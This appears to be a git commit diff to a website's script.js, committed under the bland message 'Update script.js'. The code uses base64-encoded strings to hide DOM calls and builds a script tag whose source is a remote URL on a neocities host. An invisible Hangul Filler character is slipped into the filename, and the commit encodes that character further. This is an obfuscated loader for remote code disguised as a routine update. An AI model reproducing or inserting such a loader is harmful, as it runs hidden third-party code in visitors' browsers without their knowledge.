962ead861b9fcf3eb3f6a3f8a6f71be27bc6d47c
Puyit321 <jkingpuyit@gmail.com>
2025-05-31 17:12:11 +0800

    Update script.js

--- script.js
+++ script.js
@@ -1,29 +1,29 @@
 (function(){
   const _ = atob;
   const $ = [
-    'Y3JlYXRlRWxlbWVudA==', // createElement
-    'YXBwZW5kQ2hpbGQ=',     // appendChild
-    'c2NyaXB0',             // script
-    'dHlwZQ==',             // type
-    'dGV4dC9qYXZhc2NyaXB0', // text/javascript
-    'c3Jj',                 // src
-    'b25sb2Fk',             // onload
-    'b25lcnJvcg==',         // onerror
-    'bG9n',                 // log
-    'ZXJyb3I=',             // error
-    'aGVhZA==',             // head
-    'ZG9jdW1lbnQ=',         // document
-    'aHR0cHM6Ly9zaGFyZWJvb3N0ZXIubmVvLmNpdGllcy5vcmcvc2NyaXB0Nw==', // URL base
-    'Lmpz' // .js
+    'Y3JlYXRlRWxlbWVudA==',     // createElement
+    'YXBwZW5kQ2hpbGQ=',         // appendChild
+    'c2NyaXB0',                 // script
+    'dHlwZQ==',                 // type
+    'dGV4dC9qYXZhc2NyaXB0',     // text/javascript
+    'c3Jj',                     // src
+    'b25sb2Fk',                 // onload
+    'b25lcnJvcg==',             // onerror
+    'bG9n',                     // log
+    'ZXJyb3I=',                 // error
+    'aGVhZA==',                 // head
+    'ZG9jdW1lbnQ=',             // document
+    'aHR0cHM6Ly9zaGFyZWJvb3N0ZXIubmVvLmNpdGllcy5vcmcvc2NyaXB0Nw==', // URL base (https://sharebooster.neo.cities.org/script7)
+    'JUUzJUE1JUE0',             // %E3%85%A4 (percent-encoded "ㅤ")
+    'Lmpz'                      // .js
   ];
 
   const d = window[_($[11])];
   const s = d[_($[0])](_($[2]));
 
-  // Visibly include the "ㅤ" character in the middle
-  const visiblePart = 'ㅤ'; // This character is U+3164 Hangul Filler
-
-  const url = _($[12]) + visiblePart + _($[13]);
+  // Construct the URL by joining:
+  // base + encoded invisible char + .js
+  const url = _($[12]) + _($[13]) + _($[14]);
 
   s[_($[5])] = url;
   s[_($[3])] = _($[4]);
